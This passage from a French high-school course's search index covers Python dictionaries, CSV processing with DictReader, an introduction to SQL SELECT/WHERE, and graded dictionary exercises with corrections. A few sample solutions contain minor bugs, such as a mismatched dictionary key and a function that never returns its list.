valeurs, de faire des traitements sur des bases de donn\u00e9es ou retrouver des valeurs suivant certaines conditions.             Le plus simple est d'it\u00e9rer \u00e0 l'aide d'une boucle for.             Un dictionnaire est une structure sur laquelle on peut it\u00e9rer sur les clefs (\u00e0 l'instar des tuples ou listes o\u00f9 l'on it\u00e8re sur les indices).          \ud83d\udd27 It\u00e9ration sur les clefs et valeurs <pre>\n# Afficher les clefs du dictionnaire\nfor clef in modele_voiture:\n    print(clef)\n\n#Afficher toutes les valeurs d'un dictionnaire\nfor clef in modele_voiture:\n    print(clef)\n    for valeur in modele_voiture[clef]:\n        print(valeur)\n        </pre> \u2705 V\u00e9rification de la pr\u00e9sence d'une clef              L'op\u00e9rateur in permet de v\u00e9rifier si une clef existe dans le dictionnaire.          \ud83d\udd0d V\u00e9rification d'existence <pre>\nif \"couleurs\" in modele_voiture:\n    print(\"La cl\u00e9 'couleurs' existe dans le dictionnaire\")\nelse:\n    print(\"La cl\u00e9 'couleurs' n'existe pas dans le dictionnaire\")\n        </pre> \ud83d\udca1 Utilit\u00e9 pratique              Cela permet de savoir si, par exemple on modifie une base de donn\u00e9es pour la rendre plus cons\u00e9quente, la modification a bien \u00e9t\u00e9 r\u00e9alis\u00e9e."},{"location":"premiere/V-Dictionnaires_et_Traitement_de_tables/Cours/Cours_2/","title":"Cours 2","text":"\ud83d\udcda Traitement de donn\u00e9es en tables Manipulation et analyse de fichiers CSV avec Python \ud83c\udfaf Objectifs du cours \ud83d\udcca Traitement de donn\u00e9es              Les dictionnaires de Python permettent de r\u00e9aliser des traitements sur des donn\u00e9es. Ces traitements permettent notamment de trier, organiser, s\u00e9lectionner des donn\u00e9es en fonction de crit\u00e8res.          \ud83d\udcc1 Fichiers CSV                  Le format CSV (Comma Separated Values) correspond \u00e0 un format o\u00f9 les donn\u00e9es sont structur\u00e9es par des virgules (ou des points-virgules).              \ud83d\udcca Logiciels tableurs                  Ces formats CSV sont manipulables via des logiciels tableurs (Excel, Libre Office etc...) mais on peut \u00e9galement r\u00e9aliser des traitements sur ces fichiers \u00e0 l'aide de biblioth\u00e8ques Python.              \ud83d\udcda La biblioth\u00e8que CSV \ud83d\udcd6 Fonctionnement de la biblioth\u00e8que              La biblioth\u00e8que csv permet de charger des fichiers et stocke les donn\u00e9es sous forme de listes.          \ud83d\udd27 Fonction DictReader              On ne traitera que de la fonction DictReader qui permet de traduire chaque ligne de notre fichier CSV dans des dictionnaires, eux m\u00eames stock\u00e9s dans une liste.          \ud83d\udca1 Structure d'ouverture              Voici la structure de l'ouverture d'un fichier CSV et du remplissage d'une liste organisant nos donn\u00e9es :          \ud83d\udd27 Code de base <pre>\nimport csv\n\nliste_a_remplir = []\nwith open('communes.csv', newline='') as fichier_csv:\n   lecteur = csv.DictReader(fichier_csv, delimiter=',')   # Objet DictReader (it\u00e9rateur)\n   for ligne in lecteur:\n      liste_a_remplir.append(dict(ligne))\n        </pre> \ud83d\udca1 Exemple pratique \ud83d\udcc1 Fichier d'exemple              Le fichier CSV commune.csv repr\u00e9sente l'ensemble des communes de France, associ\u00e9e \u00e0 leur code postal, d\u00e9partement etc...          \ud83d\udd27 Fonction compl\u00e8te              Pour \"ouvrir\" ce fichier CSV et structurer toutes les donn\u00e9es le comportant, on utilisera l'exemple de code suivant :          \ud83c\udfd7\ufe0f Fonction de cr\u00e9ation de liste <pre>\nimport csv\n\ndef creer_liste_villes(nom_de_fichier : str) -&gt; list:\n   villes = []\n   with open('communes.csv', newline='') as fichier_csv:\n      # M\u00e9thode DictReader qui permet de structurer les donn\u00e9es contenues dans le fichier CSV \n      # en liste de dictionnaires o\u00f9 chaque descripteur (ou attribut) est renseign\u00e9.\n      lecteur = csv.DictReader(fichier_csv, delimiter=';')   \n      for ligne in lecteur:\n         villes.append(dict(ligne))\n        </pre> \ud83d\udcca Descripteurs disponibles              Pour ce fichier CSV, il y a les descripteurs suivants : code_commune_INSEE, nom_commune_postal, code_postal, latitude, longitude, code_commune, nom_commune, nom_commune_complet, code_departement, nom_departement, code_region, nom_region \ud83d\udcc4 Aper\u00e7u du fichier CSV <pre>\ncode_commune_INSEE;nom_commune_postal;code_postal;latitude;longitude;code_commune;nom_commune;nom_departement\n01001;L'Abergement-Cl\u00e9menciat;01400;46.1667;4.9;1;L'Abergement-Cl\u00e9menciat;Ain\n01002;L'Abergement-de-Varey;01640;46.05;5.4833;1;L'Abergement-de-Varey;Ain\n...\n        </pre> \ud83d\udca1 Rappel important              La fonction DictReader permet de cr\u00e9er une liste de dictionnaires et chaque dictionnaire correspond \u00e0 une ligne du fichier CSV \u00e0 laquelle on associe chacun des attributs \u00e0 chacune des valeurs de la ligne.          \ud83d\udcca Projection de donn\u00e9es \ud83d\udccb D\u00e9finition - Projection              On appelle projection le fait d'obtenir les valeurs de certains ou tous les attributs d'une table / base de donn\u00e9es / fichiers CSV.          \ud83d\udcbb Exemple en Python <pre>\n# Exemple : Afficher le nom des villes\nfor ligne in villes:  # Pour chaque ligne dans la liste des villes\n   print(ligne[\"nom_commune\"])  # Affiche la valeur associ\u00e9e \u00e0 la cl\u00e9 'nom_commune'\n\n# Afficher le nom de toutes les villes\nfor ligne in villes:\n   print(ligne[\"nom_commune\"])\n\n# Afficher le d\u00e9partement de chaque ville\nfor ligne in villes:\n   print(\"La ville \", ligne[\"nom_commune\"], \" est dans le d\u00e9partement : \", ligne[\"nom_departement\"])\n        </pre>              Cela permet donc d'obtenir dans notre exemple de villes, le nom de celle-ci, le d\u00e9partement etc... de toutes les villes sans aucune contrainte.          \ud83c\udfaf S\u00e9lection de donn\u00e9es \ud83d\udd0d D\u00e9finition - S\u00e9lection              On appelle s\u00e9lection le fait de s\u00e9lectionner des valeurs suivant certains crit\u00e8res ou condition.             Cela permet donc d'obtenir des informations ou de r\u00e9aliser des traitements sur les donn\u00e9es d'un fichier suivant divers crit\u00e8res (par exemple sur les villes).          \ud83d\udd27 Exemples de s\u00e9lection <pre>\n# Afficher le nom des villes qui sont dans le d\u00e9partement 59\nfor ligne in villes:\n   if ligne['code_departement'] == '59':\n      print(ligne[\"nom_commune\"])\n\n# Afficher les noms des villes commen\u00e7ant par la lettre C\nfor ligne in villes:\n   if ligne[\"nom_commune\"][0] == \"C\":\n      print(ligne[\"nom_commune\"])\n        </pre> \ud83c\udfaf Exercices pratiques \ud83c\udf1f Exercices faciles \u26a1 Exercices interm\u00e9diaires Facile \ud83e\udd8a Afficher les noms des communes <p>\u00c9crire une fonction <code>afficher_noms_communes</code> qui prend une liste de dictionnaires <code>villes</code> en param\u00e8tre et affiche le nom de toutes les communes.</p> Facile \ud83e\udd8a Communes par code postal <p>\u00c9crire une fonction <code>afficher_communes_par_code_postal</code> qui prend une liste de dictionnaires <code>villes</code> et une cha\u00eene <code>code_postal</code> en param\u00e8tre, et affiche les noms des communes ayant ce code postal.</p> Facile \ud83e\udd8a Communes avec coordonn\u00e9es <p>\u00c9crire une fonction <code>afficher_communes_avec_coordonnees</code> qui prend une liste de dictionnaires <code>villes</code> en param\u00e8tre et affiche pour chaque commune son nom, sa latitude et sa longitude.</p> Interm\u00e9diaire \ud83e\udd8a\ud83e\udd8a Communes par d\u00e9partement <p>\u00c9crire une fonction <code>afficher_communes_par_departement</code> qui prend une liste de dictionnaires <code>villes</code> et une cha\u00eene <code>departement</code> en param\u00e8tre, et affiche les noms des communes du d\u00e9partement donn\u00e9.</p> Interm\u00e9diaire \ud83e\udd8a\ud83e\udd8a Noms avec longueur minimale <p>\u00c9crire une fonction <code>afficher_noms_longueur_min</code> qui prend une liste de dictionnaires <code>villes</code> et un entier <code>longueur</code> en param\u00e8tre, et renvoie la liste des noms des communes ayant un nom d'au moins <code>longueur</code> caract\u00e8res.</p> Interm\u00e9diaire \ud83e\udd8a\ud83e\udd8a Communes par latitude <p>\u00c9crire une fonction <code>afficher_communes_par_latitude</code> qui prend une liste de dictionnaires <code>villes</code> et une latitude maximale <code>max_latitude</code> en param\u00e8tre, et affiche les noms des communes ayant une latitude inf\u00e9rieure \u00e0 <code>max_latitude</code>.</p>"},{"location":"premiere/V-Dictionnaires_et_Traitement_de_tables/Cours/Cours_3/","title":"Cours 3","text":"Introduction aux bases de donn\u00e9es et au langage SQL \ud83d\udcda Introduction aux bases de donn\u00e9es et au langage SQL \ud83d\udcd6 Introduction aux Bases de Donn\u00e9es \ud83d\uddc4\ufe0f Qu'est-ce qu'une Base de Donn\u00e9es ?              Une base de donn\u00e9es est un ensemble organis\u00e9 d'informations structur\u00e9es de mani\u00e8re \u00e0 pouvoir \u00eatre facilement accessible, g\u00e9r\u00e9e et mise \u00e0 jour.             On peut associer cela \u00e0 un grand tableau organis\u00e9 en colonnes, nomm\u00e9es attributs (\u00e0 l'instar des fichiers CSV).          \ud83c\udfaf Pourquoi utiliser une Base de Donn\u00e9es ?              Le but principal des bases de donn\u00e9es est de faciliter :             <ul> <li>Le stockage organis\u00e9 : Les informations sont rang\u00e9es de fa\u00e7on structur\u00e9e, souvent sous forme de tables, ce qui facilite la gestion.</li> <li>La recherche efficace : On peut rapidement trouver des donn\u00e9es sp\u00e9cifiques gr\u00e2ce \u00e0 des requ\u00eates.</li> <li>La maintenance : On peut mettre \u00e0 jour ou supprimer des informations de fa\u00e7on s\u00e9curis\u00e9e.</li> <li>L'int\u00e9grit\u00e9 et la s\u00e9curit\u00e9 des donn\u00e9es : Les bases de donn\u00e9es relationnelles assurent que les donn\u00e9es sont fiables et prot\u00e9g\u00e9es.</li> </ul> \ud83d\udcda Historique des Bases de Donn\u00e9es Relationnelles \ud83d\udd70\ufe0f Origines              Dans les ann\u00e9es 1960, les bases de donn\u00e9es \u00e9taient tr\u00e8s basiques et souvent peu optimis\u00e9es.             En 1970, Edgar F. Codd propose le mod\u00e8le relationnel. Son id\u00e9e \u00e9tait de simplifier la gestion des donn\u00e9es en les organisant sous forme de tables reli\u00e9es par des relations logiques.          \ud83d\udd17 Le mod\u00e8le relationnel              Dans ce mod\u00e8le, les donn\u00e9es sont organis\u00e9es en tables.             Une table est constitu\u00e9e de :             <ul> <li>Lignes (ou enregistrements) : Chaque ligne repr\u00e9sente un \u00e9l\u00e9ment unique (par exemple, un \u00e9tudiant).</li> <li>Colonnes (ou attributs) : Chaque colonne d\u00e9crit une caract\u00e9ristique de cet \u00e9l\u00e9ment (par exemple, le nom, l'\u00e2ge, la classe).</li> </ul> \ud83d\udcca Exemple d'une table `Etudiants` id nom age classe 1 Alice 17 Terminale 2 Bob 16 Premi\u00e8re 3 Charlie 18 Terminale   ---   \ud83d\udcd6 Introduction au SQL \ud83d\udcbe Qu'est-ce que le SQL ?              Le SQL (Structured Query Language) est le langage utilis\u00e9 pour interagir avec une base de donn\u00e9es relationnelle. Il permet de poser des questions \u00e0 la base de donn\u00e9es et d'obtenir des r\u00e9ponses sous forme de tables. On parle de requ\u00eates SQL pour d\u00e9signer ces questions.          \u2699\ufe0f Principes de base du SQL              Le SQL permet de r\u00e9aliser des requ\u00eates de demande de donn\u00e9es suivant des crit\u00e8res plus facilement et de mani\u00e8re plus s\u00e9curis\u00e9e en communiquant avec une base de donn\u00e9es normalis\u00e9e.          \ud83d\udcca Projeter des donn\u00e9es : SELECT              La commande <code>SELECT</code> permet de r\u00e9cup\u00e9rer des lignes sp\u00e9cifiques (appel\u00e9s enregistrements) d'une table.          \u26a0\ufe0f Attention : Il ne faut pas confondre la commande SELECT avec la s\u00e9lection. S\u00e9lectionner des donn\u00e9es revient \u00e0 r\u00e9aliser une projection avec des contraintes.          \ud83d\udcbb Exemple : Obtenir toutes les informations des \u00e9tudiants <pre>SELECT * FROM Etudiants;</pre> <p><code>SELECT *</code> signifie \"retourner toutes les colonnes\". <code>FROM Etudiants</code> indique que l'on travaille avec la table Etudiants.</p> \ud83c\udfaf Exemple : Afficher uniquement le nom et l'\u00e2ge <pre>SELECT nom, age FROM Etudiants;</pre> \ud83d\udd0d S\u00e9lectionner des attributs avec WHERE \ud83c\udfaf Utilisation de WHERE              Pour s\u00e9lectionner les valeurs suivant des contraintes / conditions, on doit ajouter \u00e0 notre requ\u00eate le mot-clef <code>WHERE</code> avec une condition \u00e0 la suite.          \ud83d\udcdd Exemple : \u00c9tudiants de plus de 17 ans <pre>SELECT nom FROM Etudiants WHERE age &gt; 17;</pre> <p>Ici, on veut afficher le nom des \u00e9tudiants avec l'instruction <code>SELECT nom FROM Etudiants</code> mais en ajoutant la contrainte <code>WHERE age &gt; 17</code> permet d'obtenir tous les noms uniquement de ceux ayant plus de 17 ans.</p> \ud83d\udd75\ufe0f Activit\u00e9 : SQL Murder Mystery \ud83c\udfae Mise en pratique              Pour appliquer cela, vous pouvez vous diriger vers le site \"SQL Murder Mystery\" qui permet de r\u00e9soudre une enqu\u00eate d'un crime \u00e0 l'aide de bases de donn\u00e9es et de requ\u00eate en langage SQL. (Attention, le site est uniquement en anglais).             Vous pouvez rejoindre le site en cliquant ici"},{"location":"premiere/V-Dictionnaires_et_Traitement_de_tables/Exercices/Fiche_Exo/","title":"Fiche d'exercices : Introduction aux dictionnaires en Python","text":""},{"location":"premiere/V-Dictionnaires_et_Traitement_de_tables/Exercices/Fiche_Exo/#exercice-1-creation-dun-dictionnaire-simple","title":"Exercice 1 : Cr\u00e9ation d'un dictionnaire simple","text":"<ol> <li>Cr\u00e9er un dictionnaire nomm\u00e9 <code>personne</code> avec les informations suivantes :</li> <li>\"Nom\" : \"Leroy\"</li> <li>\"Pr\u00e9nom\" : \"Paul\"</li> <li> <p>\"\u00c2ge\" : 30</p> </li> <li> <p>Afficher le dictionnaire complet.</p> </li> </ol>"},{"location":"premiere/V-Dictionnaires_et_Traitement_de_tables/Exercices/Fiche_Exo/#exercice-2-acces-aux-valeurs-par-cle","title":"Exercice 2 : Acc\u00e8s aux valeurs par cl\u00e9","text":"<ol> <li>Cr\u00e9er un dictionnaire <code>livre</code> avec les paires suivantes :</li> <li>\"Titre\" : \"Le Petit Prince\"</li> <li>\"Auteur\" : \"Antoine de Saint-Exup\u00e9ry\"</li> <li> <p>\"Ann\u00e9e\" : 1943</p> </li> <li> <p>Afficher le titre du livre en utilisant la cl\u00e9 appropri\u00e9e.</p> </li> </ol>"},{"location":"premiere/V-Dictionnaires_et_Traitement_de_tables/Exercices/Fiche_Exo/#exercice-3-modification-dune-valeur","title":"Exercice 3 : Modification d'une valeur","text":"<ol> <li> <p>\u00c0 partir du dictionnaire <code>livre</code> de l'exercice pr\u00e9c\u00e9dent, modifier l'ann\u00e9e de publication pour qu'elle soit 1946.</p> </li> <li> <p>Afficher le dictionnaire mis \u00e0 jour.</p> </li> </ol>"},{"location":"premiere/V-Dictionnaires_et_Traitement_de_tables/Exercices/Fiche_Exo/#exercice-4-ajouter-un-element","title":"Exercice 4 : Ajouter un \u00e9l\u00e9ment","text":"<ol> <li>Cr\u00e9er un dictionnaire <code>voiture</code> avec les informations suivantes :</li> <li>\"Marque\" : \"Toyota\"</li> <li>\"Mod\u00e8le\" : \"Corolla\"</li> <li> <p>\"Ann\u00e9e\" : 2018</p> </li> <li> <p>Ajouter une cl\u00e9 \"Couleur\" avec la valeur \"Bleu\".</p> </li> <li> <p>Afficher le dictionnaire apr\u00e8s cette modification.</p> </li> </ol>"},{"location":"premiere/V-Dictionnaires_et_Traitement_de_tables/Exercices/Fiche_Exo/#exercice-5-suppression-dune-cle","title":"Exercice 5 : Suppression d'une cl\u00e9","text":"<ol> <li>Cr\u00e9er un dictionnaire <code>animal</code> avec les paires suivantes :</li> <li>\"Esp\u00e8ce\" : \"Chat\"</li> <li>\"\u00c2ge\" : 3</li> <li> <p>\"Couleur\" : \"Gris\"</p> </li> <li> <p>Supprimer la cl\u00e9 \"\u00c2ge\" et afficher le dictionnaire.</p> </li> </ol>"},{"location":"premiere/V-Dictionnaires_et_Traitement_de_tables/Exercices/Fiche_Exo/#exercice-6-verification-de-lexistence-dune-cle","title":"Exercice 6 : V\u00e9rification de l'existence d'une cl\u00e9","text":"<ol> <li>Cr\u00e9er un dictionnaire <code>ordinateur</code> avec les informations suivantes :</li> <li>\"Marque\" : \"HP\"</li> <li> <p>\"Processeur\" : \"Intel i5\"</p> </li> <li> <p>V\u00e9rifier si la cl\u00e9 \"RAM\" existe dans le dictionnaire. Afficher \"Cl\u00e9 non trouv\u00e9e\" si elle n'existe pas.</p> </li> </ol>"},{"location":"premiere/V-Dictionnaires_et_Traitement_de_tables/Exercices/Fiche_Exo/#exercice-7-utilisation-de-conditions-avec-les-valeurs","title":"Exercice 7 : Utilisation de conditions avec les valeurs","text":"<ol> <li>Cr\u00e9er un dictionnaire <code>etudiant</code> avec les informations suivantes :</li> <li>\"Nom\" : \"Martin\"</li> <li> <p>\"Note\" : 12</p> </li> <li> <p>Afficher \"Bravo !\" si la note est sup\u00e9rieure ou \u00e9gale \u00e0 10. Sinon, afficher \"Doit faire des efforts\".</p> </li> </ol>"},{"location":"premiere/V-Dictionnaires_et_Traitement_de_tables/Exercices/Fiche_Exo/#exercice-8-boucle-sur-les-cles","title":"Exercice 8 : Boucle sur les cl\u00e9s","text":"<ol> <li>Cr\u00e9er un dictionnaire <code>capitale</code> avec les paires suivantes :</li> <li>\"France\" : \"Paris\"</li> <li>\"Italie\" : \"Rome\"</li> <li> <p>\"Espagne\" : \"Madrid\"</p> </li> <li> <p>Utiliser une boucle <code>for</code> pour afficher chaque pays et sa capitale dans le format : \"La capitale de [Pays] est [Capitale]\".</p> </li> </ol>"},{"location":"premiere/V-Dictionnaires_et_Traitement_de_tables/Exercices/Fiche_Exo/#exercice-9-obtenir-toutes-les-valeurs","title":"Exercice 9 : Obtenir toutes les valeurs","text":"<ol> <li>Cr\u00e9er un dictionnaire <code>notes</code> avec les informations suivantes :</li> <li>\"Math\u00e9matiques\" : 15</li> <li>\"Physique\" : 14</li> <li> <p>\"Informatique\" : 16</p> </li> <li> <p>Afficher toutes les valeurs de notes une par une en utilisant une boucle.</p> </li> </ol>"},{"location":"premiere/V-Dictionnaires_et_Traitement_de_tables/Exercices/Fiche_Exo/#exercice-10-verification-et-ajout-conditionnel","title":"Exercice 10 : V\u00e9rification et ajout conditionnel","text":"<ol> <li>Cr\u00e9er un dictionnaire <code>profil</code> avec :</li> <li>\"Nom\" : \"Dupuis\"</li> <li> <p>\"Ville\" : \"Lyon\"</p> </li> <li> <p>Si la cl\u00e9 \"\u00c2ge\" n'existe pas dans le dictionnaire, ajouter-la avec la valeur 25.</p> </li> <li> <p>Afficher le dictionnaire final.</p> </li> </ol>"},{"location":"premiere/V-Dictionnaires_et_Traitement_de_tables/Exercices/Fiche_exercices_dictionnaires/","title":"Fiche d'exercices : Dictionnaires","text":"\ud83c\udfaf Exercices d'introduction \ud83c\udf1f Niveau Facile \ud83d\udd25 Niveau Interm\u00e9diaire \ud83d\ude80 Niveau Difficile Introduction \ud83e\udd8a Moyenne d'une interrogation <p>Un dictionnaire <code>notes</code> repr\u00e9sente les notes d'une interrogation.</p> <pre><code>notes = {\n    'Alice': 15,\n    'Bob': 12,\n    'Charlie': 18,\n    'Diana': 14\n}</code></pre> Introduction \ud83e\udd8a Cr\u00e9ation et acc\u00e8s <p>\u00c9crire une fonction <code>afficher_notes</code> qui prend en param\u00e8tre un dictionnaire et affiche la moyenne de chaque \u00e9l\u00e8ve sous la forme : <code>\"Alice a une moyenne de 15.\"</code>.</p> <p>Ajouter un commentaire selon la moyenne : <code>\"Excellent\"</code> pour une moyenne \u2265 16, <code>\"Bien\"</code> pour une moyenne entre 12 et 15 inclus, et <code>\"\u00c0 am\u00e9liorer\"</code> pour une moyenne &lt; 12.</p> \u2192 Voir la correction              <pre><code>def afficher_notes(notes):\n    for eleve in notes:\n        moyenne = notes[eleve]\n        print(eleve + \"a une moyenne de \"+ str(moyenne)+\".\")\n        if moyenne &gt;= 16:\n            print(\"Excellent\")\n        elif 12 &lt;= moyenne &lt;= 15:\n            print(\"Bien\")\n        else:\n            print(\"\u00c0 am\u00e9liorer\")</code></pre> Introduction \ud83e\udd8a Modification et ajout <p>\u00c9crire une fonction <code>ajouter_eleve(notes, nom, moyenne)</code> qui ajoute un nouvel \u00e9l\u00e8ve au dictionnaire.</p> \u2192 Voir la correction              <pre><code>def ajouter_eleve(notes, nom, moyenne):\n    # On v\u00e9rifie d'abord si l'\u00e9l\u00e8ve existe d\u00e9j\u00e0\n    if nom in notes:\n        print(\"L'\u00e9l\u00e8ve \"+nom+\" existe d\u00e9j\u00e0 !\")\n    else:\n        # Si l'\u00e9l\u00e8ve n'existe pas, on l'ajoute\n        notes[nom] = moyenne\n        print(\"L'\u00e9l\u00e8ve \"+nom+\" a \u00e9t\u00e9 ajout\u00e9 avec la moyenne de \"+str(moyenne))</code></pre> Facile \ud83e\udd8a Parcours de dictionnaire <p>\u00c9crire une fonction <code>modifier_moyenne(notes, nom, nouvelle_moyenne)</code> qui modifie la moyenne d'un \u00e9l\u00e8ve.</p> <p>G\u00e9rer le cas o\u00f9 l'\u00e9l\u00e8ve \u00e0 modifier n'existe pas.</p> \u2192 Voir la correction              <pre><code>def modifier_moyenne(notes, nom, nouvelle_moyenne):\n    # On v\u00e9rifie si l'\u00e9l\u00e8ve existe dans le dictionnaire\n    if nom in notes:\n        # Si oui, on modifie sa moyenne\n        notes[nom] = nouvelle_moyenne\n        print(\"La moyenne de \"+nom+\" a \u00e9t\u00e9 mise \u00e0 jour \u00e0 \"+str(nouvelle_moyenne))\n    else:\n        print(\"L'\u00e9l\u00e8ve \"+ nom + \" n'existe pas dans la liste\")</code></pre> Facile \ud83e\udd8a\ud83e\udd8a Dictionnaire de notes <p>\u00c9crire une fonction <code>eleves_mention(notes, seuil)</code> qui renvoie la liste des \u00e9l\u00e8ves ayant une moyenne \u2265 seuil.</p> <p>Afficher \u00e9galement le nombre total d'\u00e9l\u00e8ves ayant cette mention.</p> \u2192 Voir la correction              <pre><code>def eleves_mention(notes, seuil):\n    # On cr\u00e9e une liste vide pour stocker les \u00e9l\u00e8ves\n    eleves_avec_mention = []\n    # On parcourt le dictionnaire\n    for eleve in notes:\n        if notes[eleve] &gt;= seuil:\n            eleves_avec_mention.append(eleve)\n    # On affiche le r\u00e9sultat\n    print(str(len(eleves_avec_mention)) + \" \u00e9l\u00e8ves ont une mention\")\n    return eleves_avec_mention</code></pre> Facile \ud83e\udd8a Gestion d'un concessionnaire <p>Un dictionnaire <code>voitures</code> stocke des informations sur les voitures d'un concessionnaire.</p> <pre><code>voitures = {\n    'Peugeot 208': {'prix': 15000, 'couleur': 'rouge', 'ann\u00e9e': 2020},\n    'Renault Clio': {'prix': 12000, 'couleur': 'bleu', 'ann\u00e9e': 2019}\n}</code></pre> <p>\u00c9crire une fonction <code>voitures_par_couleur</code> qui renvoie la liste des voitures d'une couleur donn\u00e9e.</p> \u2192 Voir la correction              <pre><code>def voitures_par_couleur(voitures, couleur):\n    \"\"\"\n    Renvoie la liste des voitures d'une couleur donn\u00e9e\n    \"\"\"\n    voitures_couleur = []\n    for voiture in voitures:\n        if voitures[voiture]['couleur'] == couleur:\n            voitures_couleur.append(voiture)\n    return voitures_couleur</code></pre> Facile \ud83e\udd8a Voitures dans un budget <p>\u00c9crire une fonction <code>voitures_budget</code> qui renvoie les voitures dont le prix est inf\u00e9rieur ou \u00e9gal \u00e0 un budget donn\u00e9.</p> \u2192 Voir la correction              <pre><code>def voitures_budget(voitures, budget):\n    \"\"\"\n    Renvoie les voitures dans le budget\n    \"\"\"\n    voitures_abordables = []\n    for voiture in voitures:\n        if voitures[voiture]['prix'] &lt;= budget:\n            voitures_abordables.append(voiture)\n    return voitures_abordables</code></pre> Interm\u00e9diaire \ud83e\udd8a\ud83e\udd8a Gestion des biblioth\u00e8ques <p>Un dictionnaire <code>bibliotheque</code> stocke des informations sur les livres.</p> <pre><code>bibliotheque = {\n    'Le Petit Prince': {'auteur': 'Saint-Exup\u00e9ry', 'genre': 'Fiction', 'disponible': True},\n    '1984': {'auteur': 'Orwell', 'genre': 'Science-fiction', 'disponible': False}\n}</code></pre> <p>\u00c9crire une fonction <code>livres_disponibles</code> qui renvoie la liste des livres disponibles.</p> \u2192 Voir la correction              <pre><code>def livres_disponibles(bibliotheque):\n    \"\"\"\n    Renvoie la liste des livres disponibles\n    \"\"\"\n    livres_dispo = []\n    for livre in bibliotheque:\n        if bibliotheque[livre]['disponible']:\n            livres_dispo.append(livre)\n    return livres_dispo</code></pre> Interm\u00e9diaire \ud83e\udd8a\ud83e\udd8a Emprunter un livre <p>\u00c9crire une fonction <code>emprunter_livre</code> qui permet d'emprunter un livre (le marquer comme non disponible).</p> \u2192 Voir la correction              <pre><code>def emprunter_livre(bibliotheque, titre):\n    \"\"\"\n    Emprunte un livre s'il est disponible\n    \"\"\"\n    if titre in bibliotheque:\n        if bibliotheque[titre]['disponible']:\n            bibliotheque[titre]['disponible'] = False\n            return \"Livre emprunt\u00e9 avec succ\u00e8s\"\n        else:\n            return \"Livre d\u00e9j\u00e0 emprunt\u00e9\"\n    return \"Livre non trouv\u00e9\"</code></pre> Interm\u00e9diaire \ud83e\udd8a\ud83e\udd8a Gestion des employ\u00e9s <p>Un dictionnaire <code>employes</code> stocke des informations sur les employ\u00e9s d'une entreprise.</p> <pre><code>employes = {\n    'Alice': {'poste': 'D\u00e9veloppeur', 'salaire': 45000, 'anciennete': 3},\n    'Bob': {'poste': 'Designer', 'salaire': 40000, 'anciennete': 2}\n}</code></pre> <p>\u00c9crire une fonction <code>augmentation_salaire</code> qui augmente le salaire d'un employ\u00e9 de 10% s'il a plus de 2 ans d'anciennet\u00e9.</p> \u2192 Voir la correction              <pre><code>def augmentation_salaire(employes, nom):\n    \"\"\"\n    Augmente le salaire si l'anciennet\u00e9 &gt; 2 ans\n    \"\"\"\n    if nom in employes:\n        if employes[nom]['anciennete'] &gt; 2:\n            employes[nom]['salaire'] = int(employes[nom]['salaire'] * 1.1)\n            return \"Augmentation accord\u00e9e\"\n        else:\n            return \"Anciennet\u00e9 insuffisante\"\n    return \"Employ\u00e9 non trouv\u00e9\"</code></pre> Interm\u00e9diaire \ud83e\udd8a\ud83e\udd8a Gestion des contacts <p>Un dictionnaire <code>contacts</code> stocke des informations de contact.</p> <pre><code>contacts = {\n    'Alice': {'t\u00e9l\u00e9phone': '0123456789', 'email': 'alice@email.com', 'ville': 'Paris'},\n    'Bob': {'t\u00e9l\u00e9phone': '0987654321', 'email': 'bob@email.com', 'ville': 'Lyon'}\n}</code></pre> <p>\u00c9crire une fonction <code>rechercher_contact(nom)</code> qui affiche toutes les informations d'un contact</p> <p>\u00c9crire une fonction <code>contacts_par_ville(ville)</code> qui retourne la liste des noms des personnes habitant dans une ville donn\u00e9e</p> <p>\u00c9crire une fonction <code>modifier_telephone(nom, nouveau_telephone)</code> qui modifie le num\u00e9ro de t\u00e9l\u00e9phone d'un contact</p> \u2192 Voir la correction              <pre><code>def rechercher_contact(nom):\n    \"\"\"Affiche toutes les informations d'un contact\"\"\"\n    if nom in contacts:\n        print(f\"Informations de {nom}:\")\n        for cle, valeur in contacts[nom].items():\n            print(f\"  {cle}: {valeur}\")\n    else:\n        print(f\"Contact {nom} non trouv\u00e9.\")\n\ndef contacts_par_ville(ville):\n    \"\"\"Retourne la liste des contacts d'une ville\"\"\"\n    personnes_ville = []\n    for nom, infos in contacts.items():\n        if infos['ville'] == ville:\n            personnes_ville.append(nom)\n    return personnes_ville\n\ndef modifier_telephone(nom, nouveau_telephone):\n    \"\"\"Modifie le num\u00e9ro de t\u00e9l\u00e9phone d'un contact\"\"\"\n    if nom in contacts:\n        contacts[nom]['telephone'] = nouveau_telephone\n        print(f\"T\u00e9l\u00e9phone de {nom} mis \u00e0 jour.\")\n    else:\n        print(f\"Contact {nom} non trouv\u00e9.\")\n\n# Tests des fonctions\nrechercher_contact('Alice Martin')\nprint(\"Contacts \u00e0 Paris:\", contacts_par_ville('Paris'))\nmodifier_telephone('Bob Dupont', '06.99.88.77.66')</code></pre> Facile \ud83e\udd8a Inventaire de magasin <p>Un magasin utilise un dictionnaire pour g\u00e9rer son inventaire :</p> <pre><code>inventaire = {\n    'pommes': {'prix': 2.5, 'stock': 50},\n    'bananes': {'prix': 1.8, 'stock': 30},\n    'oranges': {'prix': 3.0, 'stock': 25}\n}</code></pre> <p>\u00c9crire les fonctions suivantes :</p> <ol> <li><code>afficher_inventaire()</code> : affiche tous les produits avec leur prix et stock</li> <li><code>produits_en_rupture()</code> : retourne la liste des produits avec un stock \u2264 10</li> <li><code>valeur_totale_stock()</code> : calcule la valeur totale du stock (prix \u00d7 quantit\u00e9 pour chaque produit)</li> </ol> \u2192 Voir la correction              <pre><code>inventaire = {\n    'pommes': {'prix': 2.5, 'stock': 50},\n    'bananes': {'prix': 1.8, 'stock': 30},\n    'oranges': {'prix': 3.0, 'stock': 25}\n}\n\ndef afficher_inventaire():\n    \"\"\"Affiche tous les produits avec prix et stock\"\"\"\n    print(\"=== INVENTAIRE ===\")\n    for produit, infos in inventaire.items():\n        print(f\"{produit}: {infos['prix']}\u20ac - Stock: {infos['stock']}\")\n\ndef produits_en_rupture():\n    \"\"\"Retourne les produits avec stock \u2264 10\"\"\"\n    rupture = []\n    for produit, infos in inventaire.items():\n        if infos['stock'] &lt;= 10:\n            rupture.append(produit)\n    return rupture\n\ndef valeur_totale_stock():\n    \"\"\"Calcule la valeur totale du stock\"\"\"\n    total = 0\n    for produit, infos in inventaire.items():\n        total += infos['prix'] * infos['stock']\n    return total\n\n# Tests\nafficher_inventaire()\nprint(\"Produits en rupture:\", produits_en_rupture())\nprint(f\"Valeur totale du stock: {valeur_totale_stock()}\u20ac\")</code></pre> Interm\u00e9diaire \ud83e\udd8a\ud83e\udd8a Syst\u00e8me de notes - Partie 1 